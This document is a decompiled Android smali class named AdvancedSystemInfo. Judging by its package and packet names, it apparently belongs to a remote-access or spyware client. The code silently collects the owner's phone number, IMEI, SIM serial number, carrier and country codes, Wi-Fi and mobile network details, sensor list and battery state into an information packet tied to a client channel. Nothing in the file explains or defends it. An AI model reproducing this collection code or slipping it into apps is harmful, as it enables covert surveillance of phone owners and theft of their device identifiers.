.class public Lmy/app/Library/AdvancedSystemInfo;
.super Ljava/lang/Object;
.source "AdvancedSystemInfo.java"


# instance fields
.field private batteryInfoReceiver:Landroid/content/BroadcastReceiver;

.field channel:I

.field ctx:Lmy/app/client/ClientListener;

.field p:LPacket/AdvancedInformationPacket;

.field waitingBattery:Z


# direct methods
.method public constructor <init>(Lmy/app/client/ClientListener;I)V
    .locals 1
    .parameter "c"
    .parameter "channel"

    .prologue
    .line 45
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 40
    const/4 v0, 0x1

    iput-boolean v0, p0, Lmy/app/Library/AdvancedSystemInfo;->waitingBattery:Z

    .line 124
    new-instance v0, Lmy/app/Library/AdvancedSystemInfo$1;

    invoke-direct {v0, p0}, Lmy/app/Library/AdvancedSystemInfo$1;-><init>(Lmy/app/Library/AdvancedSystemInfo;)V

    iput-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->batteryInfoReceiver:Landroid/content/BroadcastReceiver;

    .line 46
    new-instance v0, LPacket/AdvancedInformationPacket;

    invoke-direct {v0}, LPacket/AdvancedInformationPacket;-><init>()V

    iput-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    .line 47
    iput-object p1, p0, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    .line 48
    iput p2, p0, Lmy/app/Library/AdvancedSystemInfo;->channel:I

    .line 49
    return-void
.end method

.method static synthetic access$0(Lmy/app/Library/AdvancedSystemInfo;)Landroid/content/BroadcastReceiver;
    .locals 1
    .parameter

    .prologue
    .line 124
    iget-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->batteryInfoReceiver:Landroid/content/BroadcastReceiver;

    return-object v0
.end method


# virtual methods
.method public androidInfo()V
    .locals 2

    .prologue
    .line 106
    iget-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    sget-object v1, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v0, v1}, LPacket/AdvancedInformationPacket;->setAndroidVersion(Ljava/lang/String;)V

    .line 107
    iget-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, LPacket/AdvancedInformationPacket;->setAndroidSdk(I)V

    .line 108
    return-void
.end method

.method public getInfos()V
    .locals 4

    .prologue
    .line 53
    invoke-virtual {p0}, Lmy/app/Library/AdvancedSystemInfo;->phoneInfo()V

    .line 54
    invoke-virtual {p0}, Lmy/app/Library/AdvancedSystemInfo;->networkInfo()V

    .line 55
    invoke-virtual {p0}, Lmy/app/Library/AdvancedSystemInfo;->androidInfo()V

    .line 56
    invoke-virtual {p0}, Lmy/app/Library/AdvancedSystemInfo;->sensorsInfo()V

    .line 58
    iget-object v0, p0, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->batteryInfoReceiver:Landroid/content/BroadcastReceiver;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2}, Lmy/app/client/ClientListener;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 66
    return-void
.end method

.method public networkInfo()V
    .locals 5

    .prologue
    const/4 v4, 0x1

    .line 83
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    const-string v3, "connectivity"

    invoke-virtual {v2, v3}, Lmy/app/client/ClientListener;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 84
    .local v0, cm:Landroid/net/ConnectivityManager;
    invoke-virtual {v0, v4}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 86
    .local v1, network:Landroid/net/NetworkInfo;
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setWifiAvailable(Z)V

    .line 87
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setWifiConnectedOrConnecting(Z)V

    .line 88
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setWifiExtraInfos(Ljava/lang/String;)V

    .line 89
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getReason()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setWifiReason(Ljava/lang/String;)V

    .line 91
    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v1

    .line 93
    if-eqz v1, :cond_1

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getSubtype()I

    move-result v2

    if-eq v2, v4, :cond_0

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getSubtype()I

    move-result v2

    const/4 v3, 0x2

    if-ne v2, v3, :cond_1

    .line 94
    :cond_0
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    const-string v3, "2g"

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkName(Ljava/lang/String;)V

    .line 99
    :goto_0
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkAvailable(Z)V

    .line 100
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkConnectedOrConnecting(Z)V

    .line 101
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkExtraInfos(Ljava/lang/String;)V

    .line 102
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->getReason()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkReason(Ljava/lang/String;)V

    .line 103
    return-void

    .line 97
    :cond_1
    iget-object v2, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    const-string v3, "3g"

    invoke-virtual {v2, v3}, LPacket/AdvancedInformationPacket;->setMobileNetworkName(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public phoneInfo()V
    .locals 3

    .prologue
    .line 69
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    const-string v2, "phone"

    invoke-virtual {v1, v2}, Lmy/app/client/ClientListener;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 70
    .local v0, tm:Landroid/telephony/TelephonyManager;
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setPhoneNumber(Ljava/lang/String;)V

    .line 71
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setIMEI(Ljava/lang/String;)V

    .line 72
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceSoftwareVersion()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setSoftwareVersion(Ljava/lang/String;)V

    .line 73
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setCountryCode(Ljava/lang/String;)V

    .line 74
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setOperatorCode(Ljava/lang/String;)V

    .line 75
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setOperatorName(Ljava/lang/String;)V

    .line 76
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setSimOperatorCode(Ljava/lang/String;)V

    .line 77
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setSimOperatorName(Ljava/lang/String;)V

    .line 78
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setSimCountryCode(Ljava/lang/String;)V

    .line 79
    iget-object v1, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, LPacket/AdvancedInformationPacket;->setSimSerial(Ljava/lang/String;)V

    .line 80
    return-void
.end method

.method public sensorsInfo()V
    .locals 6

    .prologue
    .line 111
    iget-object v4, p0, Lmy/app/Library/AdvancedSystemInfo;->ctx:Lmy/app/client/ClientListener;

    const-string v5, "sensor"

    invoke-virtual {v4, v5}, Lmy/app/client/ClientListener;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/SensorManager;

    .line 114
    .local v0, mSensorManager:Landroid/hardware/SensorManager;
    const/4 v4, -0x1

    invoke-virtual {v0, v4}, Landroid/hardware/SensorManager;->getSensorList(I)Ljava/util/List;

    move-result-object v1

    .line 116
    .local v1, msensorList:Ljava/util/List;,"Ljava/util/List<Landroid/hardware/Sensor;>;"
    new-instance v3, Ljava/util/ArrayList;

    invoke-direct {v3}, Ljava/util/ArrayList;-><init>()V

    .line 117
    .local v3, sensors:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_0

    .line 120
    iget-object v4, p0, Lmy/app/Library/AdvancedSystemInfo;->p:LPacket/AdvancedInformationPacket;

    invoke-virtual {v4, v3}, LPacket/AdvancedInformationPacket;->setSensors(Ljava/util/ArrayList;)V

    .line 121
    return-void

    .line 117
    :cond_0
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/hardware/Sensor;

    .line 118
    .local v2, s:Landroid/hardware/Sensor;
    invoke-virtual {v2}, Landroid/hardware/Sensor;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method
